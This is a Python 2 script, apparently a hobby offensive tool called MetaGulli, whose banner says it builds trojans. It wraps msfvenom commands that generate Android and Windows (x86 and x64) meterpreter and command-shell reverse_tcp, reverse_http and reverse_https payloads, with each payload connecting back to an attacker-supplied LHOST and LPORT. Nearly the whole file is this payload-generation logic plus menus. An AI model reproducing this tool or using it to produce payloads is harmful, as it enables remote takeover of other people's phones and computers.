import os
import socket
import time




from termcolor import colored
from urllib2 import urlopen


# setup

# start the program presenting the use
# define line
#android
def create_payload_android_tcp(lh, lp, out):
    phrase = "msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} -o {}".format(lh, lp, out)
    os.system(phrase)


def create_payload_android_http(lh, lp, out, luri=None):
    if luri is None:
        phrase = "msfvenom -p android/meterpreter/reverse_http LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p android/meterpreter/reverse_http LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)

def create_payload_android_https(lh, lp, out, luri=None):
    if luri is None:
        phrase = "msfvenom -p android/meterpreter/reverse_https LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p android/meterpreter/reverse_https LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)

#shell
def create_payload_android_shell_tcp(lh,lp, out):
    phrase = "msfvenom -p android/shell/reverse_tcp LHOST={} LPORT={} -o {}".format(lh, lp, out)
    os.system(phrase)

def create_payload_android_shell_http(lh,lp, out, luri=None):
    if luri is None:
        phrase = "msfvenom -p android/shell/reverse_http LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p android/shell/reverse_http LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)

def create_payload_android_shell_https(lh,lp, out, luri = None):
    if luri is None:
        phrase = "msfvenom -p android/shell/reverse_https LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p android/shell/reverse_https LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)




#windows x86
def create_payload_windows_tcp(lh, lp, out):
    phrase = "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -o {}".format(lh, lp, out)
    os.system(phrase)


def create_payload_windows_http(lh, lp, out, luri=None):
    if luri is None:
        phrase = "msfvenom -p windows/meterpreter/reverse_http LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p windows/meterpreter/reverse_http LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)

def create_payload_windows_https(lh, lp, out, luri=None):
    if luri is None:
        phrase = "msfvenom -p windows/meterpreter/reverse_https LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p windows/meterpreter/reverse_https LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)

#shell
def create_payload_windows_shell_tcp(lh,lp, out):
    phrase = "msfvenom -p windows/shell/reverse_tcp LHOST={} LPORT={} -o {}".format(lh, lp, out)
    os.system(phrase)

def create_payload_windows_shell_http(lh,lp, out, luri=None):
    if luri is None:
        phrase = "msfvenom -p windows/shell/reverse_http LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p windows/shell/reverse_http LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)

def create_payload_windows_shell_https(lh,lp, out, luri = None):
    if luri is None:
        phrase = "msfvenom -p windows/shell/reverse_https LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p windows/shell/reverse_https LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)

#windows x64
def create_payload_windows_x64_tcp(lh, lp, out):
    phrase = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -o {}".format(lh, lp, out)
    os.system(phrase)


def create_payload_windows_x64_http(lh, lp, out, luri=None):
    if luri is None:
        phrase = "msfvenom -p windows/x64/meterpreter/reverse_http LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p windows/x64/meterpreter/reverse_http LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)

def create_payload_windows_x64_https(lh, lp, out, luri=None):
    if luri is None:
        phrase = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)

#shell
def create_payload_windows_shell_x64_tcp(lh,lp, out):
    phrase = "msfvenom -p windows/x64/shell/reverse_tcp LHOST={} LPORT={} -o {}".format(lh, lp, out)
    os.system(phrase)

def create_payload_windows_shell_x64_http(lh,lp, out, luri=None):
    if luri is None:
        phrase = "msfvenom -p windows/x64/shell/reverse_http LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p windows/x64/shell/reverse_http LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)

def create_payload_windows_shell_x64_https(lh,lp, out, luri = None):
    if luri is None:
        phrase = "msfvenom -p windows/x64/shell/reverse_https LHOST={} LPORT={} -o {}".format(lh, lp, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p windows/x64/shell/reverse_https LHOST={} LPORT={} LURI={} -o {}".format(lh, lp, luri, out)
        os.system(phrase)





def clear():
    print "\n\n\n\n\n\n\n\n\n\n\n\n"



def line(x):
    line = "+------------------------------------+"
    for i in range(1, x):
        line += line
    print colored(line, "cyan")


# define trattino
def trattino():
    print colored("|", "cyan")


# define start of program
def banner_init():
    print colored("""

____ ____ ____ ____ ____ ____ ____ ____ ____      
||M |||e |||t |||a |||G |||u |||l |||l |||i ||
||__|||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|


    """, 'green')
    line(2)

    print colored("|Tool designed by Filippo Gulli to build trojans using metasploit payloads|", 'blue')
    line(2)


def banner(x):
    # if x == "windows":
    #     print "\n"
    # else:
    line(2)
    print "0: payload/{}/meterpreter/reverse_http".format(x)
    line(2)
    print "1: payload/{}/meterpreter/reverse_https".format(x)
    line(2)
    print "2: payload/{}/meterpreter/reverse_tcp ".format(x)
    line(2)
    print "3: payload/{}/shell/reverse_http".format(x)
    line(2)
    print "4: payload/{}/shell/reverse_https".format(x)
    line(2)
    print "5: payload/{}/shell/reverse_tcp ".format(x)
    line(2)

def banner_windows(x):
    line(2)
    print "0: payload/{}/meterpreter/reverse_http".format(x)
    line(2)
    print "1: payload/{}/meterpreter/reverse_https".format(x)
    line(2)
    print "2: payload/{}/meterpreter/reverse_tcp ".format(x)
    line(2)
    print "3: payload/{}/shell/reverse_http".format(x)
    line(2)
    print "4: payload/{}/shell/reverse_https".format(x)
    line(2)
    print "5: payload/{}/shell/reverse_tcp ".format(x)
    line(2)

def banner_windows_x64(x):
    line(2)
    print "0: payload/{}/x64/meterpreter/reverse_http".format(x)
    line(2)
    print "1: payload/{}/x64/meterpreter/reverse_https".format(x)
    line(2)
    print "2: payload/{}/x64/meterpreter/reverse_tcp ".format(x)
    line(2)
    print "3: payload/{}/x64/shell/reverse_http".format(x)
    line(2)
    print "4: payload/{}/x64/shell/reverse_https".format(x)
    line(2)
    print "5: payload/{}/x64/shell/reverse_tcp ".format(x)
    line(2)

def pay_banner():
    phrase = """
     your external ip: {}
     your hostname : {}
    """.format(my_ip, host_name)

    print colored(phrase, "red")





# define table
def cho():
    print colored("""


+----------------------------------+---------+
|               Payload            |  Number |       
+----------------------------------+---------+
| Android payloads                 |   1     | 
| Windows Payloads                 |   2     |  
| Multi os                         |   3     |  
| Windows x64 Payloads             |   4     |
+----------------------------------+---------+
    """, "magenta")

#prende il sistema
def plat(x): #x e' il sistema che e la cvt da 0 a android
    #banner
    banner(x)
    #input in internal function
    pay_banner()
    c = input("Enter the payload to use:")
    #control as always
    if c > 5 or c < 0:
        while (c > 5 or c < 0):
            clear()
            banner(x)
            pay_banner()
            c = input("Enter the payload type number:")
    lhost = raw_input(l_p)
    lport = raw_input(p_p)
    output = raw_input(o_p)
    payload = "{}{}".format(x, payloads[c])
    #creating payload
    if x == 'android': #se sceglie android
        if c == 0:#meterpreter http
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_android_http(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_android_http(lhost, lport, output)

        if c == 1:#meterpreter https
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_android_https(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_android_https(lhost, lport, output)


        if c == 2:#meterpreter tcp
            create_payload_android_tcp(lhost, lport, output)
        if c == 3:#shell http
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_android_shell_http(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_android_shell_http(lhost, lport, output)

        if c == 4:#shell https
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_android_shell_https(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_android_shell_https(lhost, lport, output)
        if c == 5:#shell tcp
            create_payload_android_shell_tcp(lhost, lport, output)


    if x == 'windows':
        if c == 0:#meterpreter http
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_windows_http(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_windows_http(lhost, lport, output)

        if c == 1:#meterpreter https
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_windows_https(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_windows_https(lhost, lport, output)


        if c == 2:#meterpreter tcp
            create_payload_windows_tcp(lhost, lport, output)
        if c == 3:#shell http
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_windows_shell_http(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_windows_shell_http(lhost, lport, output)

        if c == 4:#shell https
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_windows_shell_https(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_windows_shell_https(lhost, lport, output)
        if c == 5:#shell tcp
            create_payload_windows_shell_tcp(lhost, lport, output)

    if x == 'windows/x64':
        if c == 0:#meterpreter http
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_windows_x64_http(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_windows_x64_http(lhost, lport, output)

        if c == 1:#meterpreter https
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_windows_x64_https(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_windows_x64_https(lhost, lport, output)


        if c == 2:#meterpreter tcp
            create_payload_windows_x64_tcp(lhost, lport, output)
        if c == 3:#shell http
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_windows_shell_x64_http(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_windows_shell_x64_http(lhost, lport, output)

        if c == 4:#shell https
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input("ENTER the uri:")
                create_payload_windows_shell_x64_https(lhost, lport, output, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                create_payload_windows_shell_x64_https(lhost, lport, output)
        if c == 5:#shell tcp
            create_payload_windows_shell_x64_tcp(lhost, lport, output)


























#variables
platforms = ("android", "windows", "multi", "windows/x64")
final = dict(enumerate(platforms))
payloads = (
"/meterpreter/reverse_http",

"/meterpreter/reverse_https" ,

"/meterpreter/reverse_tcp" ,

"/shell/reverse_http ",

"/shell/reverse_https"  ,

"/shell/reverse_tcp"
)

payloads_x64 = (
"/x64/meterpreter/reverse_http",

"/x64/meterpreter/reverse_https" ,

"/x64/meterpreter/reverse_tcp" ,

"/x64/shell/reverse_http ",

"/x64/shell/reverse_https"  ,

"/x64/shell/reverse_tcp"
)




payload_numerate = dict(enumerate(payloads))
payload_64_numerate = dict(enumerate(payloads_x64))
host_name = socket.gethostname()
my_ip = urlopen('http://ip.42.pl/raw').read()
l_p = colored("Enter LHOST:", "red")
p_p = colored("Enter LPORT:", "red")
o_p = colored("Enter the path of the output file(including the file extension ):", "red")



